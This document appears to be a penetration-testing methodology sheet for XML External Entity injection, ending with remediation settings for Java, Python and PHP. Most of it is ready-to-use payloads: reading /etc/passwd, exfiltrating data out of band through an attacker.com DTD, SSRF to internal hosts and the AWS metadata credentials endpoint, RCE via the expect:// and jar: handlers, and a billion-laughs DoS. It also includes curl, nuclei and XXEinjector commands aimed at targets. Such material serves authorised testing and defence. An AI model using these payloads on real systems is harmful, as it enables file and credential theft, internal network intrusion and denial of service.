# XML External Entity (XXE) Injection Testing

## Overview
XXE Injection exploits applications that parse XML input by injecting malicious external entity definitions. This can lead to file disclosure, SSRF, denial of service, or remote code execution.

## Classification
- **CWE:** CWE-611 (Improper Restriction of XML External Entity Reference)
- **OWASP:** A05:2021 - Security Misconfiguration
- **CVSS Base:** 7.5 - 9.8
- **MITRE ATT&CK:** T1059.007

## Detection Methodology

### 1. Identify XML Input Points
- SOAP/XML-RPC endpoints
- File upload (DOCX, XLSX, SVG, XML)
- RSS/Atom feed parsers
- SAML SSO endpoints
- API endpoints accepting XML
- Configuration file uploads
- Content-Type: application/xml or text/xml

### 2. Basic XXE — File Disclosure
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### 3. XXE via Parameter Entities
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%xxe;'>">
  %eval;
  %exfil;
]>
<data>test</data>
```

### 4. Blind XXE — Out-of-Band Data Exfiltration
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

**evil.dtd on attacker server:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 5. Blind XXE — Error-Based
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/error.dtd">
  %dtd;
]>
<data>&error;</data>
```

**error.dtd:**
```xml
<!ENTITY % payload "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%payload;
%error;
```

### 6. XXE to SSRF
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<data>&xxe;</data>

<!-- AWS metadata -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- Internal network scanning -->
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">
```

### 7. XXE to RCE
```xml
<!-- PHP expect wrapper -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<data>&xxe;</data>

<!-- Java (some parsers) -->
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/evil.class">
```

### 8. XXE in File Formats

**SVG:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

**DOCX/XLSX (modify embedded XML):**
```
1. Unzip DOCX/XLSX
2. Edit word/document.xml or xl/sharedStrings.xml
3. Add XXE entity definition
4. Rezip
5. Upload modified file
```

**SOAP:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <getData>&xxe;</getData>
  </soapenv:Body>
</soapenv:Envelope>
```

### 9. XXE Denial of Service (Billion Laughs)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<data>&lol4;</data>
```
> **Warning:** Use DoS payloads only with explicit authorization.

## Protocol Handlers by Language

| Protocol | Java | .NET | PHP | Ruby |
|----------|------|------|-----|------|
| file:// | Yes | Yes | Yes | Yes |
| http:// | Yes | Yes | Yes | Yes |
| https:// | Yes | Yes | Yes | Yes |
| ftp:// | Yes | Yes | Yes | Yes |
| jar:// | Yes | No | No | No |
| netdoc:// | Yes | No | No | No |
| php:// | No | No | Yes | No |
| expect:// | No | No | Yes* | No |
| gopher:// | No | No | Yes | No |

## Tool Usage
```bash
# XXEinjector
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=/etc/passwd --oob=http

# Nuclei XXE templates
nuclei -u http://target.com -t xxe/ -batch

# Manual with curl
curl -X POST http://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
```

## Remediation
1. **Disable external entities** in XML parser configuration
2. **Disable DTD processing** entirely when possible
3. **Use JSON** instead of XML where feasible
4. **Input validation** on XML content
5. **Whitelist allowed XML elements/attributes**
6. **Update XML parsing libraries** regularly

### Parser-Specific Disabling

**Java:**
```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**Python:**
```python
from defusedxml import ElementTree  # Use defusedxml
```

**PHP:**
```php
libxml_disable_entity_loader(true);
```

## Evidence Collection
- XML payload and response
- Files read (sanitize sensitive content)
- Internal services discovered (SSRF)
- Parser/language identified
- Impact assessment
